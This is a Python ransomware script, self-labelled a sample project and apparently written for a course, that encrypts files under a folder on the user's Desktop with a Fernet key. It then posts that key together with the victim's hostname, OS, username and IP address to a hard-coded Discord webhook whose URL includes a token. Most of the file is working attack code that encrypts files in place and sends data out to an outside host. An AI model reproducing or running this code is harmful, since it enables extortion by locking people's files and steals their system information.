import sys
import subprocess
import requests
import platform
import socket
from datetime import datetime
import os

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

required_packages = ["subprocess", "sys", "argparse","os", "pathlib", "cryptography"]
for package in required_packages:
    print(f"Checking for {package}")
    try:
        __import__(package)
    except ImportError:
        print(f"Package '{package}' not found. Installing...")
        install(package)


import argparse
# import getpass
import os
import pathlib
# import smtplib
# import platform
from cryptography.fernet import Fernet
# from email.mime.multipart import MIMEMultipart
# from email.mime.text import MIMEText
# from sendgrid import SendGridAPIClient
# from sendgrid.helpers.mail import Mail





def navigateToDir(directory):
    location = str(pathlib.Path.home()) + '/' + directory
    try:
        os.chdir(location)
        print(f"Succesfully navigated to: {location}")
        return location
    except Exception as e:
        print(f"Error occurred: {e}")
    
    return None
    

def getFiles(directory):
    files = []

    for root, sd, files in os.walk(directory):
        if "CS440" in sd:
            path = os.path.join(root, "CS440")
            for cs440root, cs440sd, cs440files in os.walk(path):
                for file in cs440files:
                    files.append(os.path.join(path, file))
            break
            
    return files


def generateKey():
    key = Fernet.generate_key()
    with open("symmetric_key.key", "wb") as keyfile:
        keyfile.write(key)
    print("Key generated and saved locally as sym key")
    
    # Send the key via desktop webhook
    send_key_to_discord(key)
    
#Function to send information to Discord webhook
def send_info_to_discord(key, encrypted_files):
    discord_webhook_url = 'https://discord.com/api/webhooks/your_webhook_id/your_webhook_token'

    #Collect system information
    system_info = {
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "os_version": platform.version(),
        "user": os.getlogin(),
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

    # Construct the payload for Discord
    data = {
        "content": "Ransomware Encryption Report",
        "embeds": [{
            "title": "Encryption Details",
            "fields": [
                {"name": "Symmetric Key", "value": key.decode(), "inline": False},
                {"name": "Encrypted Files", "value": "\n".join(encrypted_files), "inline": False},
                {"name": "Victim Hostname", "value": system_info["hostname"], "inline": True},
                {"name": "Operating System", "value": system_info["os"], "inline": True},
                {"name": "OS Version", "value": system_info["os_version"], "inline": True},
                {"name": "User", "value": system_info["user"], "inline": True},
                {"name": "Timestamp", "value": system_info["timestamp"], "inline": True}
            ]
        }]
    }

    # Send the data to the Discord webhook
    try:
        response = requests.post(discord_webhook_url, json=data)
        if response.status_code == 204:
            print("Information sent to Discord successfully.")
        else:
            print(f"Failed to send information to Discord. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending information to Discord: {e}")

    
def send_key_to_discord(key):
    # Replace with your Discord webhook URL
    discord_webhook_url = 'https://discord.com/api/webhooks/1294175755109924924/70hDsYAisH9sGSYJnXa3wr26vUcj-3X4cfVpTjwPtNAJWJq7cqtVSzKZWDuh9zxLW20n'

    #Collect system information
    computer_name = platform.node()  # Hostname
    user_os = platform.system()  # Operating System (Windows, Linux, Darwin)
    os_version = platform.version()  # OS Version
    current_user = os.getlogin()  # Username of the logged-in user
    ip_address = socket.gethostbyname(socket.gethostname())  # Victim's IP Address
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Current Timestamp

    # Construct the payload with key and system info
    data = {
        "content": "Symmetric Key and Victim Info",
        "embeds": [{
            "title": "Encryption Details",
            "fields": [
                {"name": "Symmetric Key", "value": key.decode(), "inline": False},
                {"name": "Computer Name", "value": computer_name, "inline": True},
                {"name": "Operating System", "value": user_os, "inline": True},
                {"name": "OS Version", "value": os_version, "inline": True},
                {"name": "Current User", "value": current_user, "inline": True},
                {"name": "IP Address", "value": ip_address, "inline": True},
                {"name": "Timestamp", "value": timestamp, "inline": True}
            ]
        }]
    }

    # Send the data to the Discord webhook
    try:
        response = requests.post(discord_webhook_url, json=data)
        if response.status_code == 204:
            print("Symmetric key and victim info sent to Discord successfully.")
        else:
            print(f"Failed to send information to Discord. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending information to Discord: {e}")



# def sendEmail():
#     keyfile = f"{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key"
#     message = Mail(
#         from_email='sender@example.com',  # Use a verified sender email
#         to_emails='receiver@example.com',
#         subject='Your Generated Symmetric Key',
#         html_content=f'{open(keyfile).read()}'
#     )
    
#     try:
#         sg = SendGridAPIClient('your_sendgrid_api_key')  # Replace with your SendGrid API key
#         response = sg.send(message)
#         print(f"Email sent! Status code: {response.status_code}")
#     except Exception as e:
#         print(f"Failed to send email via SendGrid. Error: {e}")

def encrypt(target):
    with open(f"{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key", "rb") as keyfile:
        key = keyfile.read()
    key = Fernet(key)
    
    if target:
        for doc in target:
            print(f"Filename is: {doc}")
            with open(doc, "rb") as file:
                original = file.read()
            cipher = key.encrypt(original) 

            with open(doc, "wb") as encrypted_file:
                encrypted_file.write(cipher)
        
        # os.remove(f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key')
    else:
        print("Target empty.")


def decrypt(target, key_path):

    with open(key_path, "rb") as key_file:
        FernetKey = key_file.read()
        print(type(FernetKey))
    key = Fernet(FernetKey)

    for doc in target:
        print(f"Decrypting {doc}")
        with open(doc, "rb") as encrypted_file:
            cipher = encrypted_file.read()
        original = key.decrypt(cipher)
        with open(doc, "wb") as decrypted_file:
            decrypted_file.write(original)



def start_point():
    parser = argparse.ArgumentParser(prog='Ransomware', description='This is a sample Ransomware project.')
    args = parser.parse_args()


    file_path = f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key'
    if os.path.isfile(file_path):
        print(f"Decrypting with {file_path}")
        directory = navigateToDir("Desktop/Test")
        target = getFiles(directory)
        decrypt(target, file_path)
    else:
        print("Encrypting")
        generateKey()
        directory = navigateToDir("Desktop/Test")
        target = getFiles(directory)
        encrypt(target)
        
start_point()